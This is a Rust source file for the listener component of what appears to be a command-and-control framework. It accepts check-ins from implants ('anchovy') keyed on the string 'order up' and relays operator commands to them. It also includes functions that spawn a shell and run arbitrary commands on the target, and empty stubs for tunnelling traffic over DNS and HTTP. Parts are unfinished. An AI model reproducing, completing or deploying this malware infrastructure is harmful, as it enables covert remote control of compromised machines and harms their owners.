use std::process::Command;
use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
use std::io::{Read, Write};
use std::format;

pub struct sysinfo {
    arch: String,
    os: String,
    hostname: String,
}


pub struct Listener {
    pub udp_sock: Option<UdpSocket>,
    pub tcp_sock: Option<TcpListener>,
    pub id: u64,
    // 0 for idle, 1 for listening, 2 for connected
    pub status: u8,
}

pub fn new_lsn(i: u64) -> Listener {
    let ret = Listener {
        udp_sock: None,
        tcp_sock: None,
        id: i,
        status: 0,
    };
    return ret;
}

pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, port: u16){
    match protocol {
        "udp" => listen_udp(lsn, address, port),
        "tcp" => listen_tcp(lsn, address, port),
        "http" => listen_tcp(lsn, address, port),
        "dns" => listen_udp(lsn, address, port),
        &_ => todo!(),
    }
}

// listens using a TcpListener
fn listen_tcp(lsn: &mut Listener, address: SocketAddr, port: u16){
    // Sets up the socket to relay data to the client over localhost
    let mut relay = UdpSocket::bind(SocketAddr::from(([127, 0, 0, 1], port))).unwrap();

    lsn.status = 1;
    lsn.tcp_sock = Some(TcpListener::bind(address).unwrap());
    println!("[+] Opening tcp listener on port {}", address.port());
    loop {
        let cmd: u8 = rcv_client_command(lsn, &mut relay);
        if cmd == 2 {
            break;
        }

        let acpt = lsn.tcp_sock.as_ref().expect("tcp listener not initialized").accept();
        match acpt {
            Ok((mut stream, _address)) => {
                let mut buffer = [0; 2048];
                let bytes = stream.read(&mut buffer[..]).unwrap();

                // replace insides of .contains() with whatever string/key we are using to verify connection
                if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
                    lsn.status = 2;
                    // switches to interact mode
                    interact_tcp(lsn, &mut stream, &mut relay);
                    lsn.status = 1;
                }
                stream.shutdown(Shutdown::Both).expect("shutdown call failed");
            }
            Err(e) => { /* Connection failed, nothing to do here. */ }
        }
    }
    lsn.status = 0;
}

// listens using a UdpSocket
fn listen_udp(lsn: &mut Listener, address: SocketAddr, port: u16){
    // Sets up the socket to relay data to the client over localhost
    let mut relay = UdpSocket::bind(SocketAddr::from(([127, 0, 0, 1], port))).unwrap();

    // Setup socket to listen for implant connection
    lsn.status = 1;
    lsn.udp_sock = Some(UdpSocket::bind(address).unwrap());
    println!("[+] Opening udp listener on port {}", address.port());
    loop { // break loop if connection is made
        // Checks for commands from the client each iteration
        let cmd: u8 = rcv_client_command(lsn, &mut relay);
        if cmd == 2 {
            break;
        }

        let mut buffer = [0; 2048];
        let (bytes, src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();

        // replace insides of .contains() with whatever string/key we are using to verify connection
        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
            lsn.status = 2;
            // switches to interact mode
            interact_udp(lsn, src, &mut relay);
            lsn.status = 1;
        }
    }
    lsn.status = 0;
}

// handles interaction with the implant
// acts as a middleman between the implant and client
fn interact_udp(lsn: &mut Listener, target: SocketAddr, relay: &mut UdpSocket) {
    println!("[+] Connection established by listener {}", lsn.id);
    let mut is_interacting: bool = false;
    loop {
        // first check for client commands
        let cc: u8 = rcv_client_command(lsn, relay);
        match cc {
            3 => break,
            4 => {
                let mut buffer = [0;2048];
                let (_rbytes, relay_src) = relay.recv_from(&mut buffer).unwrap();
                // replace the value of code here to whatever we decide should specify sending a one line command to the target
                let code: u8 = 1;
                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&buffer[..], target);
                buffer = [0;2048];
                let (_tbytes, target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
                if target_src == target {
                    relay.send_to(&buffer[..], relay_src);
                }
            },
            5 => {
                let code: u8 = 2;
                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
            },
            6 => is_interacting = true,
            //7 => ,
            _u8 => todo!(),
        }
    }
}

fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, relay: &mut UdpSocket) {
    println!("[+] Connection established by listener {}", lsn.id);
    // TODO
}

// recieves a single byte from the client: the command code
// this command code, represented as an integer, determines
// what the client wants the listener to do
// 0 => no command recieved, do nothing
// 1 => send all information about the listener
// 2 => stop listening
// 3 => terminate anchovy connection
// 4 => prepare to send_cmd to an anchovy
// 5 => begin shell on anchovy
// 6 => interact with shell on anchovy
// 7 => terminate shell on anchovy
fn rcv_client_command(lsn: &mut Listener, relay: &mut UdpSocket) -> u8 {
    let mut buffer = [0; 1];
    let (_bytes, _src) = relay.recv_from(&mut buffer).unwrap();
    // only action needed to be taken inside this function is to send back listener info
    if buffer[0] == 1 {
        let mut lsn_info = get_lsn_info(lsn);
        // TODO: send lsn_info back to client
    }
    return buffer[0];
}

// Returns a string containing the full info of a given listener
pub fn get_lsn_info(lsn: &mut Listener) -> String {
    let mut stat: &str;
    match lsn.status {
        0 => stat = "Idle",
        1 => stat = "Listening",
        2 => stat = "Bound",
        3_u8..=u8::MAX => todo!(),
    }
    let id: u64 = lsn.id;
    let mut lsn_info = format!("Listener {id} :: Status - {stat}");
    return lsn_info;
}

// Boiler function for encoding our commands into a dns packet
pub fn encode_dns(){

}

// Boiler function for encoding our commands into a http packet
pub fn encode_http(){

}


// Boiler function for decoding a dns packet for our code to read
pub fn decode_dns(){

}

// Boiler function for decoding an http packet into our own protocol
pub fn decode_http(){

}


// creates a shell on the target
pub fn shell() {
    if let Ok(command) = Command::new("/bin/sh").output(){
        println!("{}", String::from_utf8_lossy(&command.stdout));
    }
}

// executes a single arbitrary command
pub fn execute_cmd(s: String) -> String {
    if s.contains(' ') {
        let mut split = s.split_whitespace();
        let head = split.next().unwrap();
        let tail: Vec<&str> = split.collect();
        let cmd = Command::new(head).args(tail).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
    else {
        let cmd = Command::new(s).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
}
